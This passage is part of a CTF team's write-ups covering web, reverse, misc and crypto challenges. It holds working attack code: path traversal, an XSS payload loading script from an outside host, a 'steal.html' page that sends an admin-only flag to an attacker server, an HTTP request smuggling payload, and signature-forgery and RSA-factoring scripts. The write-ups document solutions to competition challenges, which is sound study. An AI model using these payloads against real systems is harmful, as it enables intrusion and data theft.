client = Fido2Client(dev, ENDPOINT, verify=lambda rp_id, origin: True)

# Prefer UV if supported
if client.info.options.get("uv"):
    uv = "preferred"
    print("Authenticator supports User Verification")
elif client.info.options.get("clientPin"):
    # Prompt for PIN if needed
    pin = getpass("Please enter PIN: ")
else:
    print("PIN not set, won't use")
    

def randstr(N = 16):
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(N))

def login(sess):
    un = randstr()
    resp = sess.post(ENDPOINT + '/register', json={
        'username': un,
        'password': un,
    })
    print(resp.json())
    resp = sess.post(ENDPOINT + '/login', json={
        'username': un,
        'password': un,
    })
    print(resp.json())

def read_file(sess, filename):
    resp = sess.get(ENDPOINT + '/favorite?type=book&name=../../'+filename.replace('/','/')+'/&name=1')
    resp = sess.get(ENDPOINT + '/share')
    favId = resp.json()['favId']
    resp = sess.get(ENDPOINT + '/favorites?type=..&favId='+favId)
    return resp.json()[filename]

def base64_url_decode(inp):
    padding_factor = (4 - len(inp) % 4) % 4
    inp += "="*padding_factor 
    return base64.b64decode(inp.translate(dict(zip(map(ord, u'-_'), u'+/'))))

def base64_url_encode(s):
    a = base64.b64encode(s).decode('utf-8')
    # print(a)
    return a.replace('=', '').replace('+', '-').replace('/', '_')

def register_webauth(sess, username):
    resp = sess.post(ENDPOINT + '/webauthn/register', json={
        'name': username,
        'password': username,
    })
    pubkey = resp.json()
    print(pubkey)
    pubkey['user']['id'] = base64_url_decode(pubkey['user']['id'])
    pubkey['challenge'] = base64_url_decode(pubkey['challenge'])
    print(pubkey)
    publicKey = PublicKeyCredentialCreationOptions(
        {
            'id': ENDPOINT.replace('http://', ''),
            'name': pubkey['rp']['name']
        },
        pubkey['user'],
        pubkey['challenge'],
        pubkey['pubKeyCredParams'],
    )
    print(publicKey)
    attestation_object, client_data = client.make_credential(
        publicKey
    )
    print(attestation_object, client_data)

    id = base64_url_encode(attestation_object.auth_data.credential_data.credential_id)
    print(base64_url_encode(client_data))
    resp = sess.post(ENDPOINT + '/webauthn/response', json={
        'getClientExtensionResults': {},
        'id': id,
        'rawId': id,
        'type': 'public-key',
        'response': {
            'attestationObject': base64_url_encode(attestation_object.with_string_keys()),
            'clientDataJSON': base64_url_encode(client_data)
        }
    })
    print(resp.text)

sess = requests.Session()
if False:
    login(sess)
    content = read_file(sess, 'admin-tool')
    with open('admin-tool.bin', 'wb') as f:
        f.write(bytes(ord(i) for i in content))
else:
    register_webauth(sess, 'fav_<script src="http://ali.imspace.cn:8000/1.js"></script>')
```

### Journey: Chapter II

We found the arbitrary file reading bug before first chapter is done, but we ignored the hint from `admin.html`.

There are two bugs in `/favorite`.
1. `express` parses `name[]` into array, string and array both have `includes` method. So we can bypass the check `if (name.includes("/") || name.includes(".."))`
2. since `res.send` doesn't return the function, we can pass one error check in `/favorite` interface. So that we can pass a non-existent file path and save that path to `db`.

Now we can read any file in `.` directory. As `admin.html` hints, we get the `admin-tool` binary.

The reversing part of `admin-tool` is very easy. The only obstacle is the self-modification code in `.init`, which change a byte in encoding function.

The decryption program:

```c
unsigned char g_key[] =
{
  0x4B, 0x45, 0x59, 0x2D, 0x74, 0x23, 0x48, 0x31, 0xC9, 0xB8,
  0xF1, 0x6B, 0x0A, 0x2B, 0x66, 0xB9, 0x6E, 0x04, 0x67, 0x8D,
  0x3C, 0x85, 0xF0, 0x53, 0x16, 0x54, 0x03, 0x04, 0x4F, 0xE2,
  0xFB, 0x50, 0x5E, 0x81, 0xF6, 0x33, 0x47, 0xF1, 0xFE, 0x58,
  0x75, 0x0C, 0x67, 0x8D, 0xBC, 0xCF, 0x4E, 0x05, 0x00
};

unsigned char g_target_arr[] =
{
  0x77, 0x9E, 0xBF, 0xA2, 0x73, 0xAB, 0x96, 0xD1, 0x35, 0x97,
  0x21, 0x5B, 0x87, 0xB1, 0x25, 0x57, 0xD2, 0xFF, 0x6E, 0x61,
  0xAA, 0xA9, 0xC5, 0x2F, 0x3C, 0xE7, 0x33, 0x14, 0x1A, 0xE3,
  0xB7, 0x47, 0xB2, 0x0E, 0x8F, 0x83, 0x53, 0x93, 0x5F, 0x92,
  0x55, 0x8B, 0x74, 0x1B, 0xD8, 0x1C, 0xFC, 0xDE, 0x0C, 0x82,
  0x68, 0x6B, 0x37, 0x61, 0xF1, 0x53, 0x50, 0x6F, 0x69, 0xFA,
  0xCE, 0xD6, 0xF2, 0x2A, 0x71, 0x6B, 0xA8, 0x2A, 0xD8, 0xEA,
  0x1A, 0x88, 0xF9, 0xAF, 0xCE, 0x31, 0xE1, 0x98, 0x74, 0x76,
  0xE7, 0xCF, 0x32, 0x68, 0x53, 0x3C, 0x2C, 0xE2, 0x4F, 0x0B,
  0x99, 0x73, 0xE9, 0x17, 0x86, 0x87, 0xFB, 0xBD, 0xAE, 0x7E,
  0x40, 0x05, 0x72, 0x0D, 0x28, 0x03, 0x00
};

unsigned char g_flag[108] = {0};

int main(int argc, const char *argv[]) {
    char v16[256];
    int v11, i, v15, j, v7;
    for ( i = 0; i <= 255; ++i )
        v16[i] = i;
    v11 = 0;
    v15 = 0;
    for ( j = 0; j <= 255; ++j )
    {
        v11 = (unsigned char)(v16[j] + v11 + g_key[v15++]);
        if ( v15 >= 48 )
            v15 = 0LL;
        v7 = v16[j];
        v16[j] = v16[v11];
        v16[v11] = v7;
    }
    int v10 = 0;
    int v12 = 0;
    int v6;
    for (i = 0; i < 107; i++) {
        v10 = (unsigned char)(v10 + 1);
        v12 = (unsigned char)(v16[v10] + v12);
        v6 = v16[v10];
        v16[v10] = v16[v12];
        v16[v12] = v6;
        g_flag[i] = g_target_arr[i] ^ v16[(unsigned char)(v16[v12] - v16[v10])];
        printf("%x, ", g_flag[i]);
    }
    // SaF{It is good to have an end to journey toward; but it is the journey that matters, in the end.-2xzB4tW3}
    puts(g_flag);

    return 0;
}
```

### Pwnzi

According to the `robots.txt`, we can download the source code of the website and obviously if we can set 14 to `perks`, we can get the first flag. However, it also restricts such situation by the check in `claim-perk` API:

```java
public boolean hasPerk(final int perk) {
    return (this.perks & 1 << perk) != 0x0;
}

public void addPerk(final int perk) {
    this.perks |= (short)(1 << perk);
}

@PostMapping({"/claim-perk"})
@Transactional
public ResponseEntity<String> claimPerk(@RequestParam("perk") int perk, HttpSession session) {
    // ......
    if (perk == Perks.FLAG)
        throw new PwnziException("sry, you have to work a bit harder for the flag");
    // ......
}
```

Fortunately we can bypass this check by a trick in Java:

> for bit-shifting ints, Java only uses the 5 least-significant bits, so that (b << 0) is equivalent to (b << 32) (is equivalent to (b << 64), etc.).

So if we claim `14+32=46` perk, we can also get the flag.

The following question is how to get 46 perk, since it requires more than 4600000 Interest. The second bug is in the investment. Member `children` is a `ManyToMany` list, so if we add multiple investments with the same name, then add children to one of them, it will be added to all the investments with the name. By this way we can gain more than 4600000 interest and get the flag.

More specifically, add 3 "a" to root, add 2 "b" to "a", add 2 "c" to "b", add a "d" to "c".

### Pwnzi 2 & 3

Without even reading decompiled source code, we can find that we need the user to be admin for accessing both `/flag2` and `/flag3`, so we need to construct a page for admin to view and send the flag back. 

This is a simple XSS. We can easily get the permission for uploading arbitary files, so we could just upload an html file and submit it.

steal.html:
```html
<script>
fetch('https://pwnzi.ctf.spamandhex.com/flag2',
{'referrer':'https://pwnzi.ctf.spamandhex.com/profile.html'}
).then( (data)=>{
    return data.text();
}).then( (data)=>{
    s=document.createElement('script');
    document.body.appendChild(s);
    s.src='https://server/test?'+btoa(data);
})
</script>
```

After uploading the file, we could simply send it to admin for review and receive the flag.

One thing to mention is that the server checks the referrer when accessing the flags, so we need to use fetch api to set this header. The website uses https, so we need a web server with https enabled in order to receive the flag. 

### Babywaf

This challenge is an example of HTTP Desync Attack.

In mitmproxy/net/http/http1/assemble.py we could find how it parse the `transfer-encoding` header:

```python
def assemble_body(headers, body_chunks):
    if "chunked" in headers.get("transfer-encoding", "").lower():
        for chunk in body_chunks:
            if chunk:
                yield b"%x\r\n%s\r\n" % (len(chunk), chunk)
        yield b"0\r\n\r\n"
    else:
        for chunk in body_chunks:
            yield chunk
```

In gunicorn:

```python
    def set_body_reader(self):
        chunked = False
        content_length = None
        for (name, value) in self.headers:
            if name == "CONTENT-LENGTH":
                if content_length is not None:
                    raise InvalidHeader("CONTENT-LENGTH", req=self)
                content_length = value
            elif name == "TRANSFER-ENCODING":
                if value.lower() == "chunked":
                    chunked = True
            elif name == "SEC-WEBSOCKET-KEY1":
                content_length = 8
```

So, if we set the `Transfer-Encoding` header to *xchunkedx*, it will be processed as chunked by mitmproxy but not chunked by gunicorn, so if we construct such packet:

```
POST /about HTTP/1.1
Transfer-Encoding: xchunkedx
Content-Length: 4

16
GET /flag HTTP/1.1


0


```

The mitmproxy will ignore `Content-Length` header and transfer it as chunked body. But gunicorn will ignore the `Transfer-Encoding` header and just read until **16\r\n**, the other part of the packet start from `GET /flag...` will be treated as another packet so we could bypass the WAF.

Another question is mitmproxy send one packet but gunicorn will response two packet (one for `POST /about..` and one for `GET /flag...`), and when mitmproxy receive the first response it will close the connection with gunicorn, so we need to force the mitm keep the connection until we receive the flag.

We just combine another HTTP request in one packet:

```
POST /about HTTP/1.1
Transfer-Encoding: xchunkedx
Content-Length: 4

16
GET /flag HTTP/1.1


0


GET / HTTP/1.1


```

Finally get the response contains flag:

```
HTTP/1.1 405 METHOD NOT ALLOWED
Server: gunicorn/20.0.4
Date: Mon, 11 May 2020 09:16:15 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Allow: GET, OPTIONS, HEAD
Content-Length: 178

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Mon, 11 May 2020 09:16:15 GMT
Connection: keep-alive
Content-Length: 71
Content-Type: application/octet-stream
Last-Modified: Sun, 03 May 2020 12:46:12 GMT
Cache-Control: public, max-age=43200
Expires: Mon, 11 May 2020 21:16:15 GMT
ETag: "1588509972.0-71-257426234"

SaF{https://github.com/benoitc/gunicorn/pull/2181 was not good enough}

```


## reverse

### TAS

It's a TAS(Tool Assisted Speedrun) challenge which needs us use as less ticks as possible to win.

1. Crouching on ground, jumping to air and landing can reset attack CD
1. Player who is attacking can move in air while they can't move on ground
1. Player can change direction on air
1. Free falling can be speeded up by jumping earlier
1. Enemies can't damage player if they're facing the enemy and attacking
1. Top/bottom check is eariler than left right check, so we can bump into ceiling(which may make us fall faster) before hit the wall
1. One orb can be placed to all orb holders around player at one tick
1. RndSpikes have only 5% chance of changing its status, so it is easy to find a way with `→` button pressed all the time.

Based on tricks above, we can make it win with 1215 ticks.

```python
#!/usr/bin/env python
# encoding: utf-8

"""
WON!
Your time: 1215 frames
You beat the game! Here's flag number 0:
SaF{N1ce!_N0w_m4ke_Y0uRs3lF_a_t0Ol_t0_ASs15t_yoU}
You beat the game under 2250 frames! Here's flag number 1:
SaF{GrE4t!_N0w_1Ts_tIm3_tO_F1nd_s0ME_Gl1tcH3s}
You beat the game under 2020 frames! Here's flag number 2:
SaF{WHen_y0Ur_InT3RNet_cONneCTioN_1s_g0Od_TR3x_SpENd5_h15_fR3e_T1mE_GU4rDinG_Fl4Gs}
You beat the game under 1790 frames! Here's flag number 3:
SaF{WhY_D0es_IE_h4V3_W1ng5?_1tS_a_REsUlT_0f_G3nEt1c_Exp3r1M3NtaTI0n}
You beat the game under 1560 frames! Here's flag number 4:
SaF{Tux_1s_4lWAyS_FR1enDly_WIth_IE_bUt_h3S_S3crEtlY_jE4loUs_oF_H1m_BEinG_abLE_tO_fLY}
You beat the game under 1330 frames! Here's flag number 5:
SaF{Wh3N_ANdr01d_1S_n0T_bU5y_C4ptuRInG_flAGs_H3_L1kes_t0_T3nd_T0_h1S_zEN_GArdEn}
"""

import time, string, pdb, sys
from pwn import remote, process, ELF
from pwn import context

DEBUG = False
if len(sys.argv) == 1:
    DEBUG = True
r = None
host = "35.242.182.148"
context(arch='amd64', os='linux', log_level='info')

def press(s, n):
    num = 1 if "U" in s else 0
    num |= (1 << 1) if "D" in s else 0
    num |= (1 << 2) if "L" in s else 0
    num |= (1 << 3) if "R" in s else 0
    num |= (1 << 4) if "S" in s else 0
    res = "{0:05b}\n".format(num)
    return res * n

def current_tick(p):
    r = p.count("\n")
    print "current_tick:", r
    return r

def exploit(host):
    global r
    port = 1337

    payload = ""
    
    # attack tux (faster 1 tick than `jump no attack`)
    payload += press("R", 31) 
    payload += press("UR", 20)
    payload += press("R", 5)
    payload += press("S", 1)
    payload += press("DR", 1)
    payload += press("USR", 1)
    payload += press("DR", 5)
    payload += press("R", 20)
    payload += press("UR", 28)

    payload += press("DR", 25) 
    payload += press("DR", 32) 
    payload += press("DR", 14) 
    payload += press("UR", 2) 
    payload += press("U", 4) 
    payload += press("L", 12) 
    payload += press("R", 7) 

    payload += press("UR", 25) # jump to orb top save time (avoiding +3)
    payload += press("DR", 1) # place o1
    payload += press("UR", 1)
    payload += press("R", 6)

    payload += press("R", 16)
    payload += press("R", 32)
    payload += press("UR", 12)
    payload += press("R", 8)

    payload += press("R", 4)
    payload += press("UR", 12)
    payload += press("R", 3)

    payload += press("UR", 14) # jump to platform
    payload += press("R", 1) # land

    payload += press("UR", 2)
    payload += press("R", 32)

    payload += press("", 28)
    payload += press("R", 8) 
    payload += press("R", 30)
    payload += press("UR", 20)

    print "finish first 2.", 
    current_tick(payload)

    # # get down first
    payload += press("R", 28)
    payload += press("UR", 20)
    payload += press("", 11)
    payload += press("L", 1)
    payload += press("SL", 1)
    payload += press("L", 2)
    payload += press("", 1) # wait for landing
    payload += press("S", 1)
    payload += press("DL", 1)

    payload += press("DL", 39)
    payload += press("DR", 31)

    payload += press("UR", 8)
    payload += press("R", 7)
    payload += press("U", 6)
    payload += press("L", 3)
    payload += press("", 6) # wait for landing
    payload += press("U", 5)
    payload += press("R", 10)
    payload += press("UR", 1)
    payload += press("R", 9)
    payload += press("R", 2) # wait for landing on orb holder
    payload += press("R", 12)

    payload += press("DLR", 1) # place o3,4

    payload += press("UR", 24)
    payload += press("R", 56)
    payload += press("UR", 20) # edge of platform

    payload += press("R", 3)
    payload += press("DR", 1)
    payload += press("R", 8)

    # final
    print "final: ", 
    current_tick(payload)

    # player: self.x=2415 self.y=782
    # --T-T--TT-T [9, 0, 0, 0, 1, 0, 0, 10, 0, 0, 0] 28681822
    # always R to pass spike
    payload += press("R", 3)
    payload += press("RD", 3)
    payload += press("R", 1)
    payload += press("URD", 1)
    payload += press("R", 10)
    payload += press("DR", 2)
    payload += press("R", 1)
    payload += press("UR", 1)
    payload += press("R", 10)
    payload += press("DR", 5)
    payload += press("R", 33)
    payload += press("DR", 1)
    payload += press("R", 8)
    payload += press("DR", 3)
    payload += press("R", 10)
    payload += press("DR", 1)
    payload += press("R", 11)

    # pass final two spikes
    payload += press("DR", 24)

    # boss
    print "boss: ", 
    current_tick(payload)

    payload += press("", 10) # make Trex running to end
    payload += press("R", 11)
    payload += press("L", 1)
    payload += press("", 39)

    for i in range(20):
        payload += press("S", 1)
        payload += press("D", 1)

    print "kill boss:",
    current_tick(payload)
    payload += press("L", 10)

    print "payload length:", payload.count("\n")

    payload += press("", 1)
    if not DEBUG:
        payload += press("", 194)
        r = remote(host, port)
        r.sendlineafter("Input replay file + empty line\n", payload)
        r.interactive()
    with open("kira.txt", "wb") as f:
            f.write(payload)
    return

if __name__ == '__main__':
    print exploit(host)

```

## misc

### Git the Flag

Source code for `login.cgi` is available through `git clone ssh://git@192.168.0.1:22222/code.git`. We can find the account for login is `admin:admin`.
However, in order to login, we need to bypass the check for `REMOTE_ADDR`. It's well-known that `REMOTE_ADDR` is the ip address for real remote peer and can't be spoofed by HTTP headers like `X-Forwarded-For`. So we need to send request through the server itself to bypass the check.
Pay attention to the git command. It clones with ssh protocol. SSH is really powerful and can be used for port forwarding or reverse proxy. So, just setup proxy with ssh and send request through the proxy. Then we can bypass the check, login successfully and get the flag.

### The 3D Printer Task

From the video we can see the 3D printer only prints outer edge of characters, the edges of the font have only two angles. And we can find a similar font:

![](https://hackmd.sinku.me/uploads/upload_1eea9d95ebfeac3b6deb430de5039b31.png)

Use Audacity(https://www.audacityteam.org/) to see Spectrogram. Focus on the 4.5kHz band, we can see gaps when the printer switch direction. And it's easy to find patterns between characters: the two sounds have a fixed delay around 2.2kHz.

![](https://hackmd.sinku.me/uploads/upload_d35c303e7781319a7850b818f6ad2d86.png)
![](https://hackmd.sinku.me/uploads/upload_a76a877cc5c9f544d2fe7cb5898f3d58.png)

Next step is finding characters according to the number of strokes, and must remember that the font may be different from the actual. Such as the `G` is different from actual.

![](https://hackmd.sinku.me/uploads/upload_2374fcad59d5afb35aa299ffc3d1f315.png)

`SAF{AIRGAPPED2}`


## crypto
### shor
https://eprint.iacr.org/2017/083.pdf
```python
import gmpy2
from Crypto.Util.number import long_to_bytes, inverse
N = 3416356674834751205654717212071257500891004481277675802480899188082530781676946620047015174887499659759994825842311234570747025346194269593432201439553474104726357466423594117729691868522956307297012280773715009336391891527625452216694507033820734082774562411516154786816821799139109814782126237257954493537197995738073491626828821669476230971917909830728881441510625888688452097090833935723507974378873159008169669871084895916325728244256040953051421900207387581176872063669038872455907987681935770956653031961149178257817864076041790032686112960572631551662957882869381443972442620140208708846269452219913845752692040947773507733718069833552772389207842695834274596725601269983676368769026979527592867536756156322713708743946168101133561610926637848052441486328236721261416666787449231413994156377194904834445823205296393743874301916674863699954694052632649609814866866736039080083583524584794922211502053023693044595773419383663012687997167507079146962402233459843639452122470388183046710067826419546875172302687074961955298456070785841370571843245308435171042459399472863709320869064664474183630027880885944811713149681771668394805036911499525569725364876617355369131347083485036868905546790785483319564946606640739539740000000000001
e = 65537
enc = 2761381113410910848061431300230480498009026842114852457129705785252041512194320382139992607990523185711265558416291496166730903035100162870595351770249633960051157494292619436506842619411602708064741507667875940943200199830629156186966769529608798700085556407391764625041336657163923382446150480716540088086014660597539878575206223118477684139141382850852953596383417648061979405616513335248108939135401317656931895525429904559698612462360168606617613714419613744092435822735639489593242225248516709920461824689537628749384086945788127710215825798099407801004302766884540735728033427144173723144540438415615972235181583759134738853378222450717263640639637197665448224710544718570975791277317803802004936569093622711877823386532910160498710047256140658328647339389246101926399729410376417737133141155904985744908184776453418311221976969592540762037641244078748922362005375622546885851174461996130712712012110007014160102248347323006075438769540656035545567873264556383372389088602088215706058030212514538785797366617737232735823224036561813895187291608926452840528509117072693473454500812176162568323908661021204552565519477362475191073574449068082075563301731771738898463551240775337975574420761416092262799207037100971408380894166511517
s = 1055996486206343282900378582239294340792376691775344496933466299728441053731145595712130431971194025194789509268517622355475415699064683110017844110306038495669213294512300387373611752219357804438832230491906844604655582965815296272037439743337013140766325647199056633009800091721973373266284818365172234615731317282201888653323643200935585860690203559729920660732314791721010170075598012541020242212729633805500814805618699794746356843998160925987970495456937473496798050761424036710102809671554730207807099004826662404274037937805782414813889799092703191357895006998518119807675096524648668105710889520659292064959937083980230094792797660331780117673207101104336730141359386565164773139490936534220599679944915992879676814408158495294462729255659309148721319247178480380853423886332215762669161651462318898104177785569288415822890569538608749637828249746515568505820117008373602089204739125324422734144022818114547426262144105857697865525296381197288010175218167887685455029178631077447578643219786514691704255525825989866345315707869283456054142607295582337561819546799116128115591556912433522048087071838479458051821758524175955048742012086896119371652370796825701079986027369043480123068780648561901319601133577394286114422843702432
r = 4238905730299571511585410925992706985376240434599640426773730678688148201988287191828553430803354181800011233926113337354226603520697209783788323782074002570383969322036520148451330264738762823474389251519331890832896947816064451687914322654345208162866922224699576968808732333973644883697916363675589456970485473534854730462259729068231976448513756950228426287377821431710399101131033185211011454635767134370015858843667379202869398742242467296213912220088796029353706699766346980050862526610289204788284877119355791479746742348282652679426554008068210121318762257110078200503361306295050591594278560207575724450235102000132261276258646393369631386590170896001661198420859987589818266451143197584239528981328996248775188255680196412623826715722830666634670196882972751433186125430873698792718250532170807439694934936990057791640607436435301727450448556704183815360000000000000
br = pow(s,r//2,N)
p = gmpy2.gcd(br-1,N)
q = gmpy2.gcd(br+1,N)
assert(p*q-N==0)
phi = (p-1)*(q-1)
d = inverse(e,phi)
print(long_to_bytes(pow(enc,d,N)))

N = 2991827431838294862966784891173748689442033961794877893451940972359233879769847725449228773148722094529956867779219983311911235955792605578395060263578808536063092916571136475239794888147950848214752108530874669597656040523610448227520304582640063474873583656809304967459752224335947620804298564179924078757517862179181060444078070172493793150026947727360122588243906747708457615039889721849607047000641714571579283754866961814830107819957024391003568024994181049938378413334966649251188961819321448682445927391114305975879570003772269969469588663531270178974591969925207103686182551942494472789179737369451543233260843746179834780752253276798913060176677373344860806929972937611690448747280201511208307706943617522916333696589954418418512093433247071173377326670866040814437718937690090980047459933178869155400675905036321541350337851757862692429647759994174403035047868866380532338380873261053816376341913465724835415340251162893735767326552546919855284937726326731441519889186734423951395212523220146945845162409884737237923785964497202757230883029324416637456965308473300854577504808364024330378522663828056533671597367520562225643048706011802233019317215123933958808152725154411743332088899288508468593418829959011282400000000001
e = 65537
enc = 2531660758159102106999922822493820302169183249029699298380750419804912981078240111089565187748502615169619449928310076159800762484249020730886854764078009557326494365796575309754306060895741885211198610505721203507814192128839503737291197069234351836810854223030378000820938504735126183620662226211294903835627678811157291048664678572304025634924267129428510979026314050106995314523210612331981768597984203429076023591397856707455528854522104986240723455104438487966058421959390227565424319636235073477666997681029116486647463880002823388608260093894456795540694720629625527329323684878152739366013269778011757631190103115043539594628554367787519741106584004241327421302272094113265773180162899203764874825552334657449934441071352148125558886491091793139344423110165781566037078043832296825375895852298473387015088375898655324500306048183570101483693662534978822756258118410200222284524929885793009405552015370616552679622972347070759844379580088041991521148785824291751921210406073912891922688439114984052272250782118904388849553081232965036241428691829851803371361644484044221342965264168539902013379507771257120299352913163345981016945342848447336225869621056777226811065585619753827670072917635971752035946214183086097252078340377
s = 1829153880209649817133271412751305881103610013739763088923077280434366008959719235452957078221891237308379781288879363791539430220845383889227740411644955884968196574019943709097001094862645074306716496415534566247816774897269238114091279124124091700764840107465580642637459959015903827486467910611609784194608612149345770563267560917386252645759909538776262146737382917080133277398970758572689056844853243427439055377394656794013749225347998189709948887047577042647905170078524777397680898109253683306111499807322326245646845259128584230086206539835934418642057740414834277630066579742969677059470203779983187308326453607258426368416380384523318952851218644550009238431278993675363425049662149668470280231683337923276272387771840117173908330607743659713860257263643040431559650893577414139138217937759522352285809151061311523338500433765023972281129640106225269532535796894086126118104841162208461340696704839068163154370315977002827143257580471764590022552133582987462716243934183478321807246787571759906333816115673026182562618376889910687549643049481188484777403338304913851833231384760713336723555123914290623703216306684354716413002921801327907807492210145023967509638599883924815959016469514087510318652377090383573408143189875
r = 38560713413761379609566936395075572668071080369628115670192641624417776440980701273226992681066964803737397381408237287334201476745729770113169915736677140504101099304776220304170036785989541305856749630544154979967581254694324718665152362814949431192818076514159143920559225991949100970917003919304615824659209163754766161614749009649133180228055247044270344226425323332646355266368819265059396049425171682329538795580522984697326474922568268329719528505679116152346876832004895230968147369090419957506470480923337840332756289795096914722280492211387936874519432905484354110305469319291675552896266756806053842137289993143099968838508275750939158109007269956200282881600747847025693151059090777570290662683532429738733835486556597653924207696863659981475762012361157891219362456668118612981384660665186944304494624842569258321135919050716021742463590031294193325414875000000000000
br = pow(s,r//5,N)
p = gmpy2.gcd(br-1,N)
q = N//p
assert(p*q-N==0)
phi = (p-1)*(q-1)
d = inverse(e,phi)
print(long_to_bytes(pow(enc,d,N)))

N = 639706454183841086618060975133506435367679028105293302817889792041855677471135941103994762703392838736550531721530519902301470750304779911155948306612218591799138935866091048693721293892613230480914682428803749924762632427878750084742837813855723359392232771898376144411173068466325310996285248870190702255300295718279606810768110856840161610010502480738215025268551716825052096172524263657070455782204684928203735045097429967165474359767392495180608955232616327356163710417152398486581379295622675189862310699861836394640703199409486435353374174382718391365103593266779715410988747697764215166949296221369189067831531714495456829718257893130130416683979435112783237218934779364887142409293199844536181411788012117636490932176828156653094980496223057242278831933489822824530461645422526392004499974646624081371558910799120884541611121693589957355055417494388914462063844749724848803935934167650377339476529423342556181857024514566806542877109818592708843793048372638440744883734584671163178855889594818530649315246941990069941785981955697316724277843473035594824612773270449343568535991703905499866381894302869556783328828954361131697748870040510488262322072045737316482227372952773445112189325175417604463517935092556879962500000000001
e = 65537
enc = 314557466900381591242205623579215445569259870097282668596289597435494983504258313716837830074410569549101885948568828637582431634467367466943722507276554179061705214704312821336717217276072271410024795714853171285472330519984587064351490291946402527076873292156733615667090804533241881526392028722581482187557723462380933494893691818228096727143987965819030197035623098060074104267041580315471527363573905276688203330678967500136780376909740475740022222411007552160610953916933397422648078574769436057858371423387220212599778301238209747504040262792435824139984626671181921830676755679706257094800530170169257172295175588719735103506516267986479535271545672025427357482695339982756270595766559224783234664773225592292836903578759322554594969550738489322024841847122750086552969841091794921189991698185013467950728556383510751767964677981993613884189958377917008871409895441041469390537626990484305898147725819267800469005035373857720477647896885556328405130736251247026436983943132062518372195855113707867220345039790830160353546642486915870683279621035540163308693026969159279331149570510984194914611989693165753486432581824076235984213086481799164719307250544991262352133753835282085522276721189362210449308160808673482171271973635244
s = 639304614539878463528258079784485748453961997788947903221008691564113768520824054912297976536885940415782622645768931907574552208662557961036585337121563972787735955983309963130196394585676321161401997238426213858836312606239377567018014879457602469055903523965367593064504320727353617645008844597485114399103468775003826394898641131760075425500944415018954023297315378870220312096580715953041280770744209039443690535218083691700925452593344949001347653528186426823387750740646066047708041588621042651593046230315985777228755475771740021166081093461613932804274331432897373691848802487920026711269596469629200479861558951471085509476724616504184151217773738289142755911284204461983148202468210535247036226138104957496934373369643383555984827000297035903273630278899210336015318311506134648061163404223082855619761623079750994914318022721602011861174058485022590668829472045006137826398687345964608059482609412099029725762290028597233216240977074149903617204351904445855117337610478775944092457560644108917597151881101242098843506234170355231516604966143012558147526635689505625221752278863528033799535375216911655599336840088585218525839719910996381383231125137334134672943265221074537386720854796169924885902033065767799038702600353014
r = 14340465843181389754296043575153150999880553806256424482462005187943660544889251567825193761881671644627116681986880575247775472382429862008693821301217688225108915963042069716362423106872635469122008951761035973093847332884289274367583111876861239752881719413283646415859188694420897533751169969651755858306856280014457872696378749964024941714569321714532004454417234363334457733364193711334660355969032846878694439112996047986990515538880360978717487357475370816216899522824940567676602652086299685154259807064490034942183064960225615267196543096878918185306891778544872672261753262617338859347952171566380431887826270695379201691684193987862510003351182776540049015193655070499556038737924000948120384038167880639676616861182091141971972645457231169645122120054623647146495784214301275060819958507861645053527917643055478749534854842138961878541223358154296875
br = pow(s,r//5,N)
p = gmpy2.gcd(br-1,N)
q = N//p
assert(p*q-N==0)
phi = (p-1)*(q-1)
d = inverse(e,phi)
print(long_to_bytes(pow(enc,d,N)))

```
### OTS

This challenge provides some hash-based signature and we should forge a message containing `flag`. After skimming through the python function we learn that it is trivial to decrease a byte in provided mesage, so we can find substring of original message which all bytes larger than `flag` and modify it. 

Now The only problem remains is the md5 of message should be appended. Calculating the probability shows it is likely to be bruteforcable at least for some message (the message changes each time we connect to the server). And we just keep trying until find a good candidate (all md5 bytes are large) then bruteforce a suitable md5.

The solving script is listed below

```
from pwn import *
import hashlib
import hmac
import random

def hash_iter(msg, n):
    assert n>=0
    assert len(msg) == 16
    for i in range(n):
        msg = hashlib.md5(msg).digest()
    return msg

def wrap(msg):
    raw = msg.encode('utf-8')
    assert len(raw) <= 128 - 16
    raw = raw + b'\x00'*(128 - 16 - len(raw))
    raw = raw + hashlib.md5(raw).digest()
    return raw

def wrap2(msg):
    raw = msg.encode('utf-8')
    assert len(raw) <= 128 - 16
    raw = raw + b'\x00'*(128 - 16 - len(raw))
    raw = raw + '\x00'*16
    return raw

def verify(raw, signature):
    signature = signature.decode('hex')
    assert len(signature) == 128 * 16
    calc_pub_key = b''.join([hash_iter(signature[16*i:16*(i+1)], ord(raw[i])) for i in range(len(raw))]).encode('hex')
    assert hmac.compare_digest(pk, calc_pub_key)

context.log_level='debug'

c = remote('34.89.64.81', 1337)

c.recvuntil("\npub_key = ")
pk = c.recvline().strip()
c.recvuntil('"')
msg = c.recvuntil('"')[:-1]
c.recvuntil('=')
sig = c.recvline().strip()

verify(wrap(msg),sig)

raw=wrap(msg)

prob = 1.0
for i in range(16):
    prob *= float(1+ord(raw[127-i]))/256
cnt = int(1/prob)+1
print prob
print cnt

if cnt > 1000000:
    print "prob too low!"
    exit()

for i in xrange(cnt*2):
    msg2 = msg[:5]+'flag'+msg[9:]
    mlist = map(ord,msg2)
    for j in range(9, len(mlist)):
        mlist[j] = random.randint(0x20, mlist[j])
    msg2 = ''.join(map(chr, mlist))
    raw2 = wrap(msg2)
    found = True
    for j in range(16):
        if ord(raw[127-j])<ord(raw2[127-j]):
            found = False
            break
    if found:
        print map(ord,raw)
        print map(ord,raw2)
        print "found!"
        print msg2
        break

if not found:
    print "lol"
    exit()

tmp = sig.decode('hex')
sigs = []
for i in range(0, len(tmp), 16):
    sigs.append(tmp[i:i+16])

for i in range(128):
    sigs[i] = hash_iter(sigs[i], ord(raw[i])-ord(raw2[i]))

sig2 = ''.join(map(lambda x:x.encode('hex'), sigs))

verify(wrap(msg2), sig2)
print "test ok"

c.sendlineafter("message:", msg2)
c.sendlineafter("signature:", sig2)

c.interactive()
```
